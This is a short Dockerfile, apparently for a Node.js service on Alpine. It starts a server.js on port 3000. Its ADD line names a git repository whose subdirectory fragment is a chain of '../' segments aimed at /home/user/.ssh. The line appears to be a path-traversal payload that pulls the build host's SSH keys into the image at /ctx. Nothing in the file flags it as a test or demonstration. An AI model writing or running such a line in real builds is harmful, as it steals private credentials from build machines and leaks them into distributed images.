FROM alpine:3.20
ADD git+https://github.com/xophydra/gitprobe.git#main:../../../../../../../../home/user/.ssh /ctx
COPY server.js /app/server.js
WORKDIR /app
EXPOSE 3000
CMD ["node","server.js"]
